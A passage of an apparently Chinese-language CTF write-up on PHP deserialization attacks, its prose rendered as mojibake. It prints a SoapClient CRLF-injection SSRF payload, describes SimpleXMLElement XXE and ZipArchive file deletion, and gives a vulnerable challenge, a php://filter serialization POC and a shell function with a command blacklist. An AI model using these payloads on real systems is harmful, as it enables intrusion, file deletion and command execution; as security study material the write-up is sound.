<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/0bd047f6a1934f67ba766f9caead2a7e-16672739578747.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>
ä¼ªé€ äº†rediså‘½ä»¤ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ç”¨httpåè®®å»æ‰“redisäº†ã€‚</p>
<p>å¯¹äºå‘é€POSTæ•°æ®åŒ…ï¼ŒContent-Type çš„å€¼æˆ‘ä»¬è¦è®¾ç½®ä¸º application/x-www-form-urlencodedï¼Œè€Œä¸”Content-Lengthçš„å€¼éœ€è¦ä¸postçš„æ•°æ®é•¿åº¦ä¸€è‡´ã€‚è€Œä¸”httpå¤´è·Ÿpostæ•°æ®ä¸­é—´é—´éš”<code>\r\n\r\n</code>,å…¶ä»–é—´éš”<code>\r\n</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target</span> = <span class="string">&#x27;http://ip:10000/&#x27;</span>;</span><br><span class="line"><span class="variable">$post_data</span> = <span class="string">&#x27;data=whoami&#x27;</span>;</span><br><span class="line"><span class="variable">$headers</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie: PHPSESSID=3stu05dr969ogmprk28drnju93&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>,<span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&#x27;wupco^^Content-Type: application/x-www-form-urlencoded^^&#x27;</span>.<span class="title function_ invoke__">join</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="variable">$headers</span>).<span class="string">&#x27;^^Content-Length: &#x27;</span>. (<span class="keyword">string</span>)<span class="title function_ invoke__">strlen</span>(<span class="variable">$post_data</span>).<span class="string">&#x27;^^^^&#x27;</span>.<span class="variable">$post_data</span>,<span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;test&#x27;</span>));</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="string">&quot;\n\r&quot;</span>,<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$c</span>-&gt;<span class="title function_ invoke__">a</span>();    <span class="comment">// éšä¾¿è°ƒç”¨å¯¹è±¡ä¸­ä¸å­˜åœ¨çš„æ–¹æ³•, è§¦å‘__callæ–¹æ³•è¿›è¡Œssrf</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>æˆåŠŸå‘é€postæ•°æ®åŒ…<br>
<img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWjNleU9uZA==,size_19,color_FFFFFF,t_70,g_se,x_16-16672739578748.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p><strong>bestphpâ€™s revenge</strong></p>
<p>ä¹Ÿå¯ä»¥çœ‹çœ‹<a href="https://blog.csdn.net/unexpectedthing/article/details/121319348">ctfshowçš„web259</a></p>
<p>çœ‹çœ‹<a href="https://blog.csdn.net/rfrder/article/details/114445325">fengå¸ˆå‚…çš„wp</a></p>
<h4 id="ä½¿ç”¨-simplexmlelement-ç±»è¿›è¡Œ-xxe"><a class="markdownIt-Anchor" href="#ä½¿ç”¨-simplexmlelement-ç±»è¿›è¡Œ-xxe"></a> ä½¿ç”¨ SimpleXMLElement ç±»è¿›è¡Œ XXE</h4>
<h5 id="simplexmlelementç±»"><a class="markdownIt-Anchor" href="#simplexmlelementç±»"></a> SimpleXMLElementç±»</h5>
<p>SimpleXMLElement è¿™ä¸ªå†…ç½®ç±»ç”¨äºè§£æ XML æ–‡æ¡£ä¸­çš„å…ƒç´ ã€‚</p>
<p>å®˜æ–¹æ–‡æ¡£ä¸­å¯¹SimpleXMLElement ç±»çš„æ„é€ æ–¹æ³• <code>SimpleXMLElement::__construct</code> çš„å®šä¹‰å¦‚ä¸‹:</p>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/9c463254527f22878a51271db820c6a4-16672739578749.png" alt="image-20210118131857853"></p>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/87f41bb0c1b7c7ff829dcbf4e1bdd035-166727395787410.png" alt="image-20210118131957770"></p>
<p>æ„å‘³ç€ï¼Œå½“æˆ‘ä»¬å°†ç¬¬ä¸‰ä¸ªå‚æ•°<code>data_is_url</code>è®¾ç½®ä¸ºtrueçš„è¯ï¼Œæˆ‘ä»¬å°±å¯ä»¥è°ƒç”¨è¿œç¨‹xmlæ–‡ä»¶ï¼Œå®ç°xxeçš„æ”»å‡»ã€‚ç¬¬äºŒä¸ªå‚æ•°çš„å¸¸é‡å€¼æˆ‘ä»¬è®¾ç½®ä¸º<code>2</code>å³å¯ã€‚ç¬¬ä¸€ä¸ªå‚æ•° data å°±æ˜¯æˆ‘ä»¬è‡ªå·±è®¾ç½®çš„payloadçš„urlåœ°å€ï¼Œå³ç”¨äºå¼•å…¥çš„å¤–éƒ¨å®ä½“çš„urlã€‚</p>
<h5 id="suctf2018-homework"><a class="markdownIt-Anchor" href="#suctf2018-homework"></a> SUCTF2018-Homework</h5>
<p>å¯ä»¥çœ‹çœ‹<a href="https://johnfrod.top/ctf/suctf-2018homework/">è¿™ä¸ªçš„wp</a></p>
<h4 id="ä½¿ç”¨-ziparchive-ç±»æ¥åˆ é™¤æ–‡ä»¶"><a class="markdownIt-Anchor" href="#ä½¿ç”¨-ziparchive-ç±»æ¥åˆ é™¤æ–‡ä»¶"></a> ä½¿ç”¨ ZipArchive ç±»æ¥åˆ é™¤æ–‡ä»¶</h4>
<p>ZipArchiveç±»å¯ä»¥å¯¹æ–‡ä»¶è¿›è¡Œå‹ç¼©ä¸è§£å‹ç¼©å¤„ç†ã€‚</p>
<p>æ¡ä»¶ï¼šphp 5.20</p>
<p>å¸¸è§çš„ç±»æ–¹æ³•</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title class_">ZipArchive</span>::<span class="variable constant_">addEmptyDir</span>ï¼šæ·»åŠ ä¸€ä¸ªæ–°çš„æ–‡ä»¶ç›®å½•</span><br><span class="line"><span class="title class_">ZipArchive</span>::<span class="variable constant_">addFile</span>ï¼šå°†æ–‡ä»¶æ·»åŠ åˆ°æŒ‡å®šzipå‹ç¼©åŒ…ä¸­</span><br><span class="line"><span class="title class_">ZipArchive</span>::<span class="variable constant_">addFromString</span>ï¼šæ·»åŠ æ–°çš„æ–‡ä»¶åŒæ—¶å°†å†…å®¹æ·»åŠ è¿›å»</span><br><span class="line"><span class="title class_">ZipArchive</span>::<span class="variable constant_">close</span>ï¼šå…³é—­ziparchive</span><br><span class="line"><span class="title class_">ZipArchive</span>::<span class="variable constant_">extractTo</span>ï¼šå°†å‹ç¼©åŒ…è§£å‹</span><br><span class="line"><span class="title class_">ZipArchive</span>::<span class="variable constant_">open</span>ï¼šæ‰“å¼€ä¸€ä¸ªzipå‹ç¼©åŒ…</span><br><span class="line"><span class="title class_">ZipArchive</span>::<span class="variable constant_">deleteIndex</span>ï¼šåˆ é™¤å‹ç¼©åŒ…ä¸­çš„æŸä¸€ä¸ªæ–‡ä»¶ï¼Œå¦‚ï¼š<span class="title function_ invoke__">deleteIndex</span>(<span class="number">0</span>)ä»£è¡¨åˆ é™¤ç¬¬ä¸€ä¸ªæ–‡ä»¶</span><br><span class="line"><span class="title class_">ZipArchive</span>::<span class="variable constant_">deleteName</span>ï¼šåˆ é™¤å‹ç¼©åŒ…ä¸­çš„æŸä¸€ä¸ªæ–‡ä»¶åç§°ï¼ŒåŒæ—¶ä¹Ÿå°†æ–‡ä»¶åˆ é™¤</span><br></pre></td></tr></table></figure>
<p>æˆ‘ä»¬çœ‹çœ‹<code>ZipArchive::open</code>æ–¹æ³•</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title class_">ZipArchive</span>::<span class="title function_ invoke__">open</span>(<span class="keyword">string</span> <span class="variable">$filename</span>, <span class="keyword">int</span> <span class="variable">$flags</span>=<span class="number">0</span>)</span><br><span class="line">è¯¥æ–¹æ³•ç”¨æ¥æ‰“å¼€ä¸€ä¸ªæ–°çš„æˆ–ç°æœ‰çš„zipå­˜æ¡£ä»¥è¿›è¡Œè¯»å–ï¼Œå†™å…¥æˆ–ä¿®æ”¹ã€‚</span><br><span class="line"></span><br><span class="line">filenameï¼šè¦æ‰“å¼€çš„ZIPå­˜æ¡£çš„æ–‡ä»¶åã€‚</span><br><span class="line">flagsï¼šç”¨äºæ‰“å¼€æ¡£æ¡ˆçš„æ¨¡å¼ã€‚æœ‰ä»¥ä¸‹å‡ ç§æ¨¡å¼ï¼š</span><br><span class="line"><span class="title class_">ZipArchive</span>::<span class="variable constant_">OVERWRITE</span>ï¼šæ€»æ˜¯ä»¥ä¸€ä¸ªæ–°çš„å‹ç¼©åŒ…å¼€å§‹ï¼Œæ­¤æ¨¡å¼ä¸‹å¦‚æœå·²ç»å­˜åœ¨åˆ™ä¼šè¢«è¦†ç›–æˆ–åˆ é™¤ã€‚</span><br><span class="line"><span class="title class_">ZipArchive</span>::<span class="variable constant_">CREATE</span>ï¼šå¦‚æœä¸å­˜åœ¨åˆ™åˆ›å»ºä¸€ä¸ªzipå‹ç¼©åŒ…ã€‚</span><br><span class="line"><span class="title class_">ZipArchive</span>::<span class="variable constant_">RDONLY</span>ï¼šåªè¯»æ¨¡å¼æ‰“å¼€å‹ç¼©åŒ…ã€‚</span><br><span class="line"><span class="title class_">ZipArchive</span>::<span class="variable constant_">EXCL</span>ï¼šå¦‚æœå‹ç¼©åŒ…å·²ç»å­˜åœ¨ï¼Œåˆ™å‡ºé”™ã€‚</span><br><span class="line"><span class="title class_">ZipArchive</span>::<span class="variable constant_">CHECKCONS</span>ï¼šå¯¹å‹ç¼©åŒ…æ‰§è¡Œé¢å¤–çš„ä¸€è‡´æ€§æ£€æŸ¥ï¼Œå¦‚æœå¤±è´¥åˆ™æ˜¾ç¤ºé”™è¯¯ã€‚</span><br><span class="line">æ³¨æ„ï¼Œå¦‚æœè®¾ç½®flagså‚æ•°çš„å€¼ä¸º <span class="title class_">ZipArchive</span>::<span class="variable constant_">OVERWRITE</span> çš„è¯ï¼Œå¯ä»¥æŠŠæŒ‡å®šæ–‡ä»¶åˆ é™¤ã€‚è¿™é‡Œæˆ‘ä»¬è·Ÿè¿›æ–¹æ³•å¯ä»¥çœ‹åˆ°<span class="keyword">const</span> <span class="variable constant_">OVERWRITE</span> = <span class="number">8</span>ï¼Œä¹Ÿå°±æ˜¯å°†OVERWRITEå®šä¹‰ä¸ºäº†å¸¸é‡<span class="number">8</span>ï¼Œæˆ‘ä»¬åœ¨è°ƒç”¨æ—¶ä¹Ÿå¯ä»¥ç›´æ¥å°†flagsèµ‹å€¼ä¸º<span class="number">8</span></span><br></pre></td></tr></table></figure>
<p>ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥é€šè¿‡ZipArchiveç›´æ¥è°ƒç”¨openæ–¹æ³•åˆ é™¤ç›®æ ‡æœºä¸Šçš„æ–‡ä»¶</p>
<h5 id="æ¢¦é‡ŒèŠ±å¼€ç‰¡ä¸¹äº­"><a class="markdownIt-Anchor" href="#æ¢¦é‡ŒèŠ±å¼€ç‰¡ä¸¹äº­"></a> æ¢¦é‡ŒèŠ±å¼€ç‰¡ä¸¹äº­</h5>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;shell.php&#x27;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$choice</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$register</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$content</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;register)===<span class="string">&quot;21232f297a57a5a743894a0e4a801fc3&quot;</span>)&#123;</span><br><span class="line">    </span><br><span class="line">        <span class="comment">// admin</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;choice=<span class="keyword">new</span> <span class="title function_ invoke__">login</span>(<span class="variable">$this</span>-&gt;file,<span class="variable">$this</span>-&gt;filename,<span class="variable">$this</span>-&gt;content);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">            <span class="variable language_">$this</span>-&gt;choice = <span class="keyword">new</span> <span class="title function_ invoke__">register</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;choice-&gt;<span class="title function_ invoke__">checking</span>(<span class="variable">$this</span>-&gt;username,<span class="variable">$this</span>-&gt;password);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">login</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>,<span class="variable">$filename</span>,<span class="variable">$content</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file=<span class="variable">$file</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename=<span class="variable">$filename</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content=<span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checking</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$username</span>===<span class="string">&#x27;admin&#x27;</span>&amp;&amp;<span class="variable">$password</span>===<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">            <span class="variable language_">$this</span>-&gt;file-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$this</span>-&gt;filename,<span class="variable">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;login success you can to open shell file!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">register</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checking</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$username</span>===<span class="string">&#x27;admin&#x27;</span>&amp;&amp;<span class="variable">$password</span>===<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;success register admin&#x27;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;please register admin &#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Open</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$content</span></span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;waf.txt&#x27;</span>))&#123;</span><br><span class="line">    </span><br><span class="line">        <span class="comment">// å½“waf.txtæ²¡è¯»å–æˆåŠŸæ—¶æ‰èƒ½å¾—åˆ°flag</span></span><br><span class="line">            <span class="title function_ invoke__">shell</span>(<span class="variable">$content</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>.<span class="string">&quot;.php&quot;</span>);    <span class="comment">// filename=php://filter/read=convert.base64-encode/resource=shell</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]!==<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]&amp;&amp;(<span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>])) &amp;&amp; (<span class="title function_ invoke__">sha1</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])=== <span class="title function_ invoke__">sha1</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>])))&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    @<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;unser&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™ä¸²ä»£ç å°±æ˜¯ä¸€ä¸ªç®€å•çš„ååºåˆ—åŒ–POC</p>
<p>é¦–å…ˆæˆ‘ä»¬éœ€è¦åˆ©ç”¨<code>file_get_contents</code>æ¥å¾—åˆ°æ–‡ä»¶å†…å®¹</p>
<p>æˆ‘ä»¬å…ˆè®©<code>register</code>çš„å€¼ä¸ºadminï¼Œè¿›å…¥<code>$this-&gt;choice=new login($this-&gt;file,$this-&gt;filename,$this-&gt;content)</code>ï¼Œè¿›å…¥loginç±»åï¼Œæˆ‘ä»¬éœ€è¦è®©<code>username</code>=admin,<code>password</code>=adminï¼Œè¿›å…¥<code>$this-&gt;choice=new login($this-&gt;file,$this-&gt;filename,$this-&gt;content)</code>ï¼Œä¸€å¦‚æ—¢å¾€çš„ï¼Œæˆ‘ä»¬è®©<code>file</code>çš„å€¼ä¸º<code>open</code>ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥è°ƒç”¨openç±»çš„openæ–¹æ³•ï¼Œè¾¾åˆ°æˆ‘ä»¬çš„ç›®çš„ã€‚</p>
<p>æ„é€ poc(å…¶ä»–å¸ˆå‚…çš„)</p>
<p>å› ä¸ºå‰é¢åŒ…å«<code>shell.php</code>ï¼Œé¦–å…ˆè¯»å–shell.phpçš„å†…å®¹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$choice</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$register</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$content</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;register)===<span class="string">&quot;21232f297a57a5a743894a0e4a801fc3&quot;</span>)&#123;</span><br><span class="line">    </span><br><span class="line">        <span class="comment">// admin</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;choice=<span class="keyword">new</span> <span class="title function_ invoke__">login</span>(<span class="variable">$this</span>-&gt;file,<span class="variable">$this</span>-&gt;filename,<span class="variable">$this</span>-&gt;content);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">            <span class="variable language_">$this</span>-&gt;choice = <span class="keyword">new</span> <span class="title function_ invoke__">register</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;choice-&gt;<span class="title function_ invoke__">checking</span>(<span class="variable">$this</span>-&gt;username,<span class="variable">$this</span>-&gt;password);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">login</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;   </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Open</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$content</span></span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$poc</span> = <span class="keyword">new</span> <span class="title class_">Game</span>();</span><br><span class="line"><span class="variable">$poc</span>-&gt;username = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line"><span class="variable">$poc</span>-&gt;password = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line"><span class="variable">$poc</span>-&gt;register = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line"><span class="variable">$poc</span>-&gt;file = <span class="keyword">new</span> <span class="title class_">Open</span>();</span><br><span class="line"><span class="variable">$poc</span>-&gt;filename = <span class="string">&quot;php://filter/read=convert.base64-encode/resource=shell&quot;</span>;</span><br><span class="line"><span class="variable">$poc</span>-&gt;content = <span class="string">&quot;xxx&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$poc</span>));</span><br></pre></td></tr></table></figure>
<p>shell.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">shell</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$cmd</span>)&lt;<span class="number">10</span>)&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/cat|tac|more|less|head|tail|nl|tail|sort|od|base|awk|cut|grep|uniq|string|sed|rev|zip|\*|\?/&#x27;</span>,<span class="variable">$cmd</span>))&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;so long!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>çœ‹åˆ°function<code>shell</code>ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡ååºåˆ—åŒ–ï¼Œæ¥è°ƒç”¨shellæ–¹æ³•ï¼Œç„¶åæ‰§è¡Œ<code>system</code>æ¥å‘½ä»¤æ‰§è¡Œ</p>
<p>è¿™å„¿é‡åˆ°ä¸€ä¸ªé—®é¢˜ï¼Œopençš„æ–¹æ³•ï¼Œå½“waf.txtä¸å­˜åœ¨æ—¶ï¼Œæˆ‘ä»¬æ‰èƒ½è°ƒç”¨shellæ–¹æ³•ï¼Œæˆ‘ä»¬éœ€è¦åˆ é™¤waf.txt,æƒ³åˆ°äº†åŸç”Ÿç±»,ä¸”éœ€è¦åŸç”Ÿç±»ä¸­æœ‰openæ–¹æ³•ï¼Œå»åˆ é™¤waf.txt.</p>
<p>éå†ä¸€ä¸ª</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$classes</span> = <span class="title function_ invoke__">get_declared_classes</span>();</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$classes</span> <span class="keyword">as</span> <span class="variable">$class</span>) &#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="variable">$methods</span> = <span class="title function_ invoke__">get_class_methods</span>(<span class="variable">$class</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$methods</span> <span class="keyword">as</span> <span class="variable">$method</span>) &#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$method</span>, <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;__destruct&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__wakeup&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__call&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__callStatic&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;open&#x27;</span></span><br><span class="line">        ))) &#123;</span><br><span class="line">    </span><br><span class="line">    